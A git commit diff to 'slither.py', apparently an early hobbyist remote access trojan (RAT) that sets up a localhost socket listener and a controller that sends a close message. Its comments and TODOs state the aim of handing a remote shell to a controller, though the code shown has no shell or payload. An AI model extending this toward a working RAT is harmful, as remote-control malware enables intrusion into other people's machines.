317e8cecbea0bf92457f406118f5290cebbe7410
Pythonic2023 <daltonfaust7295@gmail.com>
2024-10-29 19:40:00 -0400

    Added while loop for continuous operation of the RAT until it receives connection.close.
    Handled error with exception: ConnectionRefusedError [Errno 111]

--- slither.py
+++ slither.py
@@ -9,22 +9,41 @@ import sys
 import argparse
 
 
-# TODO: 2) Function to execute on depending on options, create RAT socket and call to client or create the client socket
-"""Function for rat to initialize and call out for the controller, for now don't call out to controller"""
+# TODO: Make remote socket non blocking, keep remote socket open after receiving message
 
-
+# Rat socket, listens on port and waits for a connection.
 def remote_sock():
+    connection = True
     address = '127.0.0.1'
     port = 9000
 
     rat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     rat_socket.bind((address, port))
-    print(f"[*] Bound to {address, port}")
+    print(f"[*] Bound to {address} at port {port}")
     rat_socket.listen()
     print(f"[*] Listening")
-    client_sock, addr = rat_socket.accept()
-    client_msg = client_sock.recv(1024)
-    print(client_msg.decode())
+    while connection:
+        conn, addr = rat_socket.accept()
+        client_msg = conn.recv(1024)
+        print(client_msg.decode())
+        if client_msg.decode() == 'connection.close':
+            connection = False
+        else:
+            continue
+
+
+# Controller socket, connects to rat socket and receives a shell.
+def controller():
+    address = '127.0.0.1'
+    port = 9000
+
+    try:
+        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_sock.connect((address, port))
+        client_sock.send(b'connection.close')
+        client_sock.close()
+    except ConnectionRefusedError:
+        print('CONNECTION REFUSED')
 
 
 # TODO: 1) Check if we are the RAT or client, execute program accordingly.
@@ -44,8 +63,16 @@ parser.add_argument('-c', '--control', action='store_true')
 
 args = parser.parse_args()
 
+if __name__ == "__main__":
+    if sys.argv[1] == '-r':
+        remote_sock()
+    else:
+        controller()
+
 # TODO: 3) If RAT, create a shell and provide it to the client
 
 # TODO: 4) If client, create socket and wait for RAT to send shell
 
 # TODO: 5) extras...
+
+#  TODO: FIX MY TODO's
